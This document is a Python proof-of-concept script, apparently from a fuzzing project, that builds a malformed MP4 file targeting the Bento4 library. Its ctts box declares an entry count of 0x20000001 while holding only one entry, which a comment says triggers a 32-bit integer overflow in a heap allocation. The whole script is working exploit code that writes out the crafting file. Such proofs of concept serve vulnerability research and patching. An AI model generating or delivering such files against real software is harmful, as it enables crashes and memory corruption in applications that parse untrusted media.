#!/usr/bin/env python3
import struct, os

OUT_DIR = '/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4AtomSampleTable_h'
OUT_FILE = os.path.join(OUT_DIR, 'vuln_001.mp4')

def box(btype, data):
    assert len(btype) == 4
    size = 8 + len(data)
    return struct.pack('>I', size) + btype + data

def fullbox(btype, version, flags, data):
    hdr = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF))
    return box(btype, hdr + data)

# --- ctts (malicious): entry_count=0x20000001, 1 real entry ---
ctts_data = struct.pack('>I', 0x20000001)   # entry_count — triggers 32-bit overflow in new[]
ctts_data += struct.pack('>II', 1, 0)        # 1 actual entry: sample_count=1, sample_offset=0
ctts = fullbox(b'ctts', 0, 0, ctts_data)

# --- stsd: empty ---
stsd = fullbox(b'stsd', 0, 0, struct.pack('>I', 0))  # entry_count=0

# --- stts: empty ---
stts = fullbox(b'stts', 0, 0, struct.pack('>I', 0))

# --- stsc: empty ---
stsc = fullbox(b'stsc', 0, 0, struct.pack('>I', 0))

# --- stsz: empty ---
stsz = fullbox(b'stsz', 0, 0, struct.pack('>II', 0, 0))  # sample_size=0, sample_count=0

# --- stco: empty ---
stco = fullbox(b'stco', 0, 0, struct.pack('>I', 0))

# --- stbl container ---
stbl = box(b'stbl', stsd + stts + stsc + stsz + stco + ctts)

# --- smhd ---
smhd = fullbox(b'smhd', 0, 0, struct.pack('>HH', 0, 0))  # balance=0, reserved=0

# --- dref: empty ---
dref = fullbox(b'dref', 0, 0, struct.pack('>I', 0))  # entry_count=0

# --- dinf container ---
dinf = box(b'dinf', dref)

# --- minf container ---
minf = box(b'minf', smhd + dinf + stbl)

# --- mdhd (version 0) ---
mdhd_data  = struct.pack('>IIII', 0, 0, 44100, 0)  # creation, modification, timescale, duration
mdhd_data += struct.pack('>HH', 0x55C4, 0)           # language=und, pre_defined=0
mdhd = fullbox(b'mdhd', 0, 0, mdhd_data)

# --- hdlr ---
hdlr_data  = struct.pack('>I', 0)        # pre_defined
hdlr_data += b'soun'                      # handler_type
hdlr_data += b'\x00' * 12               # reserved
hdlr_data += b'Handler\x00'              # name (8 bytes)
hdlr = fullbox(b'hdlr', 0, 0, hdlr_data)

# --- mdia container ---
mdia = box(b'mdia', mdhd + hdlr + minf)

# --- tkhd (version 0, flags=3) ---
tkhd_data  = struct.pack('>IIII', 0, 0, 1, 0)    # creation, modification, track_id, reserved
tkhd_data += struct.pack('>I', 0)                  # duration
tkhd_data += b'\x00' * 8                           # reserved
tkhd_data += struct.pack('>HH', 0, 0)             # layer, alternate_group
tkhd_data += struct.pack('>HH', 0x0100, 0)        # volume, reserved
tkhd_data += struct.pack('>9i',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)                              # matrix (36 bytes)
tkhd_data += struct.pack('>II', 0, 0)              # width, height
tkhd = fullbox(b'tkhd', 0, 3, tkhd_data)

# --- trak container ---
trak = box(b'trak', tkhd + mdia)

# --- mvhd (version 0) ---
mvhd_data  = struct.pack('>IIII', 0, 0, 1000, 0)  # creation, modification, timescale, duration
mvhd_data += struct.pack('>I', 0x00010000)          # rate
mvhd_data += struct.pack('>H', 0x0100)              # volume
mvhd_data += struct.pack('>H', 0)                   # reserved
mvhd_data += b'\x00' * 8                            # reserved
mvhd_data += struct.pack('>9i',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)                               # matrix (36 bytes)
mvhd_data += b'\x00' * 24                           # pre_defined
mvhd_data += struct.pack('>I', 2)                   # next_track_ID
mvhd = fullbox(b'mvhd', 0, 0, mvhd_data)

# --- moov container ---
moov = box(b'moov', mvhd + trak)

# --- ftyp ---
ftyp = box(b'ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42')

# --- mdat (empty) ---
mdat = box(b'mdat', b'')

# --- final MP4 ---
mp4_data = ftyp + moov + mdat

os.makedirs(OUT_DIR, exist_ok=True)
with open(OUT_FILE, 'wb') as f:
    f.write(mp4_data)
print(f'Written {len(mp4_data)} bytes to {OUT_FILE}')
